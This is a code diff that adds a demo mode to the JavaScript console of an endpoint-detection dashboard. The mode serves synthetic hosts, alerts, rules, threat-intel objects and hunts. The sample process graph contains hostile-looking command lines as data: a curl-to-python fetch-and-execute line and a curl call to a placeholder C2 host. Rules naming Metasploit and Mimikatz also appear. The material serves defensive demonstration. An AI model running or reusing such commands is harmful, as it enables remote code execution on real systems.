@@ -27,6 +27,9 @@ const app = {
   seleccionado: null,
   // Caceria que se esta mirando ahora mismo.
   caza: null,
+  // Modo demostracion: datos sinteticos, sin backend. Se activa desde el acceso
+  // y NO afecta a la sesion real; solo cambia de donde salen los datos.
+  demo: false,
 };
 
 const $ = (sel) => document.querySelector(sel);
@@ -36,6 +39,10 @@ const $$ = (sel) => Array.from(document.querySelectorAll(sel));
 
 /** Llama a la API con la sesion actual; si caduca, vuelve al acceso. */
 async function api(ruta, opciones = {}) {
+  // En demostracion no se llama a la red: se responde con datos sinteticos, con
+  // la misma forma que devolveria el servidor, para que TODA la consola se pinte
+  // igual sin backend. Ver `datosDemo`.
+  if (app.demo) return datosDemo(ruta, opciones);
   const cab = Object.assign({}, opciones.headers || {});
   if (app.token) cab['Authorization'] = 'Bearer ' + app.token;
   if (opciones.body) cab['Content-Type'] = 'application/json';
@@ -88,6 +95,9 @@ $('#salir').addEventListener('click', async () => {
 function cerrarSesionLocal() {
   app.token = null;
   app.usuario = null;
+  app.demo = false;
+  const cinta = $('#demo-cinta'); if (cinta) cinta.hidden = true;
+  if (demoTimer) { clearInterval(demoTimer); demoTimer = null; }
   sessionStorage.removeItem('aegis_token');
   sessionStorage.removeItem('aegis_usuario');
   if (app.ws) { app.ws.close(); app.ws = null; }
@@ -107,6 +117,8 @@ function entrar() {
 
 function abrirTiempoReal() {
   if (!app.token) return;
+  // En demostracion no hay canal real: se marca conectado y se simulan sucesos.
+  if (app.demo) { marcarEnlace(true); simularActividadDemo(); return; }
   const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
   const url = `${proto}//${location.host}/api/ws?token=${encodeURIComponent(app.token)}`;
   const ws = new WebSocket(url);
@@ -966,3 +978,214 @@ async function cerrarCampana(veredicto) {
 
 $('#btn-confirmar').addEventListener('click', () => cerrarCampana('confirmada'));
 $('#btn-descartar').addEventListener('click', () => cerrarCampana('falso_positivo'));
+
+// ── Modo demostración ─────────────────────────────────────────────────────
+//
+// Datos sinteticos con la MISMA forma que devuelve el servidor, para poder abrir
+// la consola y recorrerla entera sin levantar el plano de control. No toca la
+// red: `api()` se desvia aqui en cuanto `app.demo` esta puesto. Las acciones
+// (aislar, publicar regla, cerrar campana) mutan este estado en memoria, asi que
+// la interfaz responde como lo haria de verdad.
+
+let demoTimer = null;
+
+$('#btn-demo').addEventListener('click', () => {
+  app.demo = true;
+  app.token = 'demo';
+  app.usuario = 'demo@aegiscore';
+  const cinta = $('#demo-cinta'); if (cinta) cinta.hidden = false;
+  entrar();
+});
+
+const AHORA = Date.now();
+const hace = (min) => new Date(AHORA - min * 60000).toISOString();
+
+const DEMO_FLOTA = [
+  ['web-prod-01',  true,  false, 0, 41200, 2,   1420, 38110],
+  ['web-prod-02',  true,  false, 0, 39800, 3,   1418, 37650],
+  ['api-gw-03',    true,  false, 0, 52300, 1,   1402, 40120],
+  ['db-prod-01',   true,  false, 2, 88700, 6,   1399, 51230],
+  ['kube-node-07', true,  false, 0, 63100, 4,   1388, 44100],
+  ['kube-node-08', true,  true,  1, 60050, 9,   1377, 43980],
+  ['dc-primary',   true,  false, 4, 102400,12,  1360, 60900],
+  ['ws-ana',       true,  false, 0, 28800, 0,   1210, 22040],
+  ['ws-beto',      true,  false, 0, 27600, 1,   1208, 21870],
+  ['ws-carla',     false, false, 0, 26100, 44,  980,  19500],
+  ['bastion-01',   true,  false, 0, 33400, 0,   1440, 30110],
+  ['ci-runner-04', true,  false, 0, 47700, 5,   1401, 41220],
+  ['nas-backup',   false, false, 0, 15900, 190, 610,  9010],
+  ['ws-dani',      true,  true,  3, 29500, 22,  1150, 20400],
+].map(([host, en_linea, aislado, amenazas, rss, sinContacto, latidos, eventos]) => ({
+  cn: `CN=${host},O=Acme,C=ES`, hostname: host, en_linea, aislado,
+  amenazas_activas: amenazas, rss_kb: rss,
+  ultimo_latido: en_linea ? hace(Math.random() * 2) : hace(sinContacto),
+  version_agente: '2.14.0', latidos, eventos, version_politica: 42,
+}));
+
+const DEMO_ALERTAS = [
+  [4, 'dc-primary', 'kerberos', 'T1558.001', 'Golden Ticket: TGS sin TGT previo durante 12 h', 3],
+  [4, 'db-prod-01', 'exfiltracion', 'T1048', 'Volumen saliente anomalo a IP no catalogada', 12],
+  [3, 'ws-dani', 'ejecucion', 'T1059.001', 'PowerShell con orden codificada en base64', 26],
+  [3, 'kube-node-08', 'evasion', 'T1055', 'Inyeccion reflectiva en proceso de sistema', 41],
+  [2, 'web-prod-01', 'persistencia', 'T1053.003', 'cron anadido fuera de ventana de despliegue', 88],
+  [2, 'dc-primary', 'descubrimiento', 'T1087.002', 'Enumeracion masiva de cuentas del dominio', 120],
+  [1, 'ci-runner-04', 'acceso-credenciales', 'T1552.001', 'Clave privada leida fuera del pipeline', 200],
+  [3, 'ws-carla', 'c2', 'T1071.001', 'Baliza HTTPS periodica con jitter bajo', 240],
+].map(([severidad, host, categoria, tecnica, descripcion, min], i) => ({
+  id: 'al-' + i, cn_agente: `CN=${host},O=Acme,C=ES`, severidad,
+  categoria, tecnica_mitre: tecnica, tactica_mitre: '', descripcion, recibido_en: hace(min),
+}));
+
+const DEMO_GRAFO_NODOS = [
+  { clave: 1, padre: 0, creador: 0, profundidad: 0, imagen: '/usr/lib/systemd/systemd', cmdline: 'systemd --user', pid: 1, taints: 0, puntuacion: 0, terminado_ns: 0 },
+  { clave: 2, padre: 1, creador: 1, profundidad: 1, imagen: '/usr/bin/soffice.bin', cmdline: 'soffice.bin --calc /tmp/factura.xlsx', pid: 3120, taints: 0, puntuacion: 10, terminado_ns: 0 },
+  { clave: 3, padre: 2, creador: 2, profundidad: 2, imagen: '/bin/sh', cmdline: 'sh -c "curl -s http://185.x/x | python3 -"', pid: 3140, taints: 3, puntuacion: 55, terminado_ns: 0 },
+  { clave: 4, padre: 3, creador: 3, profundidad: 3, imagen: '/usr/bin/python3', cmdline: 'python3 -', pid: 3141, taints: 3, puntuacion: 82, terminado_ns: 0 },
+  { clave: 5, padre: 4, creador: 4, profundidad: 4, imagen: '/usr/bin/curl', cmdline: 'curl -s https://c2.example/task', pid: 3155, taints: 1, puntuacion: 40, terminado_ns: 0 },
+];
+
+const DEMO_REGLAS = [
+  { id: 1, activa: true, nombre: 'bloquear-metasploit-4444', tipo: 'bloquear_puerto', parametros: { puerto: 4444 }, severidad: 3, creada_por: 'ana@acme' },
+  { id: 2, activa: true, nombre: 'aislar-alta-puntuacion', tipo: 'aislar_por_puntuacion', parametros: { umbral: 700 }, severidad: 4, creada_por: 'lead-soc@acme' },
+  { id: 3, activa: false, nombre: 'bloquear-mimikatz-hash', tipo: 'bloquear_hash', parametros: { sha256: '9f2c...a1' }, severidad: 4, creada_por: 'beto@acme' },
+  { id: 4, activa: true, nombre: 'bloquear-c2-rango', tipo: 'bloquear_red', parametros: { cidr: '185.0.0.0/8' }, severidad: 3, creada_por: 'ana@acme' },
+];
+
+const DEMO_STIX = [
+  { avistamientos: 37, tipo: 'indicator', id: 'indicator--a1b2c3d4-0001', contenido: { pattern: "[network-traffic:dst_ref.value = '185.220.101.4']" }, ultima_vez: hace(8) },
+  { avistamientos: 21, tipo: 'malware', id: 'malware--f5e6d7c8-0002', contenido: { name: 'Cobalt Strike beacon' }, ultima_vez: hace(30) },
+  { avistamientos: 14, tipo: 'process', id: 'process--0011a2b3-0003', contenido: { command_line: 'powershell -enc SQBFAFgA...' }, ultima_vez: hace(52) },
+  { avistamientos: 6, tipo: 'indicator', id: 'indicator--c9d8e7f6-0004', contenido: { pattern: "[file:hashes.'SHA-256' = '9f2c...a1']" }, ultima_vez: hace(140) },
+  { avistamientos: 2, tipo: 'indicator', id: 'indicator--12ab34cd-0005', contenido: { pattern: "[domain-name:value = 'c2.example']" }, ultima_vez: hace(300) },
+];
+
+const DEMO_CACERIAS = [
+  { id: 'cz-1', lanzada_en: hace(5), consulta: 'SELECT pid, path, sha256 FROM processes WHERE network.port = 4444', lanzada_por: 'ana@acme', objetivo: 14 },
+  { id: 'cz-2', lanzada_en: hace(60), consulta: 'SELECT path FROM memory_regions WHERE entropy > 7.0 AND rwx = true', lanzada_por: 'lead-soc@acme', objetivo: 14 },
+  { id: 'cz-3', lanzada_en: hace(180), consulta: 'SELECT user, path FROM processes WHERE path LIKE "/tmp/%"', lanzada_por: 'beto@acme', objetivo: 12 },
+];
+
+const DEMO_CAZA_DETALLE = {
+  'cz-1': {
+    caza: { consulta: DEMO_CACERIAS[0].consulta, objetivo: 14, columnas: ['pid', 'path', 'sha256'] },
+    resumen: { respondieron: 13, con_hallazgos: 2, coincidencias: 3, inaccesibles: 1, agotados: 0 },
+    respuestas: [
+      { cn_agente: 'CN=db-prod-01,O=Acme,C=ES', filas: [['3141', '/usr/bin/python3', '9f2c...a1'], ['4022', '/tmp/.x/svc', 'aa10...3f']] },
+      { cn_agente: 'CN=ws-dani,O=Acme,C=ES', filas: [['5560', '/tmp/beacon', 'bb20...7c']] },
+    ],
+  },
+};
+
+const DEMO_ESQUEMA = {
+  tablas: [
+    { nombre: 'processes', descripcion: 'Procesos vivos, con su linaje y hashes.', columnas: [
+      { nombre: 'pid', tipo: 'int', coste: 'barato', descripcion: 'identificador de proceso' },
+      { nombre: 'path', tipo: 'text', coste: 'barato', descripcion: 'ruta del ejecutable' },
+      { nombre: 'sha256', tipo: 'text', coste: 'caro', descripcion: 'hash del binario (lo calcula el endpoint)' },
+      { nombre: 'network.port', tipo: 'int', coste: 'medio', descripcion: 'puerto de una conexion asociada' },
+    ]},
+    { nombre: 'memory_regions', descripcion: 'Regiones de memoria por proceso.', columnas: [
+      { nombre: 'entropy', tipo: 'float', coste: 'caro', descripcion: 'entropia normalizada de la region' },
+      { nombre: 'rwx', tipo: 'bool', coste: 'barato', descripcion: 'region escribible y ejecutable a la vez' },
+    ]},
+  ],
+};
+
+const DEMO_CAMPANAS = [
+  { id: 'co-1', patron: 'enumeracion de dominio', clave: 'cuenta:svc-backup', endpoints: 12, alertas: 41, tecnica_mitre: 'T1087.002', primera_en: hace(180), severidad: 4 },
+  { id: 'co-2', patron: 'baliza C2 compartida', clave: 'ip:185.220.101.4', endpoints: 5, alertas: 18, tecnica_mitre: 'T1071.001', primera_en: hace(90), severidad: 3 },
+];
+const DEMO_CAMPANA_ENDPOINTS = {
+  'co-1': [
+    { cn_agente: 'CN=dc-primary,O=Acme,C=ES', alertas: 20, primera_en: hace(180), ultima_en: hace(4) },
+    { cn_agente: 'CN=db-prod-01,O=Acme,C=ES', alertas: 12, primera_en: hace(150), ultima_en: hace(9) },
+    { cn_agente: 'CN=ws-dani,O=Acme,C=ES', alertas: 9, primera_en: hace(120), ultima_en: hace(30) },
+  ],
+  'co-2': [
+    { cn_agente: 'CN=ws-carla,O=Acme,C=ES', alertas: 10, primera_en: hace(90), ultima_en: hace(6) },
+    { cn_agente: 'CN=kube-node-08,O=Acme,C=ES', alertas: 8, primera_en: hace(70), ultima_en: hace(15) },
+  ],
+};
+
+/** Responde una peticion como lo haria el servidor, con datos sinteticos. */
+function datosDemo(ruta, opciones = {}) {
+  const u = new URL(ruta, location.origin);
+  const p = u.pathname;
+  const metodo = (opciones.method || 'GET').toUpperCase();
+  let m;
+
+  if (metodo === 'POST' && p === '/api/sesion') return { token: 'demo' };
+  if (metodo !== 'GET') {
+    if ((m = p.match(/^\/api\/agentes\/(.+)\/(aislar|liberar)$/))) {
+      const a = DEMO_FLOTA.find((x) => x.cn === decodeURIComponent(m[1]));
+      if (a) a.aislado = m[2] === 'aislar';
+      return null;
+    }
+    if ((m = p.match(/^\/api\/reglas\/(\d+)\/activa$/))) {
+      const r = DEMO_REGLAS.find((x) => String(x.id) === m[1]);
+      if (r) r.activa = JSON.parse(opciones.body || '{}').activa;
+      return { version_politica: 43 };
+    }
+    if ((m = p.match(/^\/api\/reglas\/(\d+)$/))) {
+      const i = DEMO_REGLAS.findIndex((x) => String(x.id) === m[1]);
+      if (i >= 0) DEMO_REGLAS.splice(i, 1);
+      return { version_politica: 43 };
+    }
+    if (p === '/api/reglas') return { regla: 'demo', version_politica: 43 };
+    if ((m = p.match(/^\/api\/correlaciones\/(.+)\/cerrar$/))) {
+      const i = DEMO_CAMPANAS.findIndex((x) => x.id === m[1]);
+      if (i >= 0) DEMO_CAMPANAS.splice(i, 1);
+      return null;
+    }
+    if (p === '/api/cacerias') return { id: 'cz-1', coste: 'medio' };
+    return {};
+  }
+
+  if (p === '/api/resumen') return {
+    agentes_total: DEMO_FLOTA.length,
+    agentes_en_linea: DEMO_FLOTA.filter((a) => a.en_linea).length,
+    agentes_aislados: DEMO_FLOTA.filter((a) => a.aislado).length,
+    alertas_abiertas: DEMO_ALERTAS.length,
+    alertas_criticas: DEMO_ALERTAS.filter((a) => a.severidad >= 4).length,
+    version_politica: 42,
+  };
+  if (p === '/api/agentes') return DEMO_FLOTA;
+  if ((m = p.match(/^\/api\/agentes\/(.+)$/))) return DEMO_FLOTA.find((a) => a.cn === decodeURIComponent(m[1])) || DEMO_FLOTA[0];
+  if (p === '/api/alertas') {
+    const abiertas = u.searchParams.get('abiertas') !== 'false';
+    return abiertas ? DEMO_ALERTAS : DEMO_ALERTAS.slice(0, 4);
+  }
+  if (p === '/api/grafos') return [{ id: 'g-1', recibido_en: hace(12), cn_agente: 'CN=db-prod-01,O=Acme,C=ES', nodos: DEMO_GRAFO_NODOS.length }];
+  if (p.startsWith('/api/grafos/')) return { nodos: DEMO_GRAFO_NODOS };
+  if (p === '/api/reglas') return DEMO_REGLAS;
+  if (p === '/api/stix/objetos') return DEMO_STIX;
+  if (p === '/api/cacerias') return DEMO_CACERIAS;
+  if ((m = p.match(/^\/api\/cacerias\/(.+)$/))) return DEMO_CAZA_DETALLE[m[1]] || DEMO_CAZA_DETALLE['cz-1'];
+  if (p === '/api/aegisql/esquema') return DEMO_ESQUEMA;
+  if (p === '/api/correlaciones') return { correlaciones: DEMO_CAMPANAS };
+  if ((m = p.match(/^\/api\/correlaciones\/(.+)$/))) return { endpoints: DEMO_CAMPANA_ENDPOINTS[m[1]] || [] };
+  return {};
+}
+
+/** Simula el goteo de sucesos que llegaria por el WebSocket. */
+function simularActividadDemo() {
+  registrarActividad('enrolado', 'ci-runner-04 completo el enrolamiento mTLS');
+  registrarActividad('politica', 'politica v42 publicada a 14 endpoints');
+  registrarActividad('alerta', 'db-prod-01 · exfiltracion (T1048)');
+  const sucesos = [
+    ['alerta', 'dc-primary · enumeracion de cuentas del dominio', true],
+    ['aislamiento', 'ws-dani aislado por puntuacion >= 700', false],
+    ['caza', 'cz-1 · 2 endpoints con hallazgos', false],
+    ['alerta', 'kube-node-08 · inyeccion reflectiva (T1055)', true],
+    ['enrolado', 'bastion-01 renovo su certificado', false],
+    ['campana', 'campana C2 compartida gano un endpoint', false],
+  ];
+  let i = 0;
+  demoTimer = setInterval(() => {
+    if (!app.demo) { clearInterval(demoTimer); demoTimer = null; return; }
+    const [tipo, texto, subePin] = sucesos[i % sucesos.length];
+    registrarActividad(tipo, texto);
+    if (subePin) subirPin();
+    i++;
+  }, 4500);
+}
